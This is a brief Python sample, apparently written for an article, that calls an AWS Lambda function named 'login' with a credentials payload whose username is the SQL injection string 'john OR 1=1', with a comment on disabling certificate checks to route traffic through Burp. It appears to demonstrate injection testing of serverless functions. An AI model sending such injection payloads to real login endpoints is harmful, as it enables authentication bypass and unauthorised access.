# Sample code for an article

import boto3,json

client = boto3.client('lambda')
#client = boto3.client('lambda', verify=False) # in case wants to pass through burp/proxy
credentials = {
	'login':'john OR 1=1',
	'password':'letmein',
	}
response = client.invoke(
	FunctionName="login",
	Payload= json.dumps(credentials)
	)

res = response['Payload'].read().decode('utf-8')
print('------ Response -------')
print(res)
print('----')
print('---Response for debug---')
print(response)
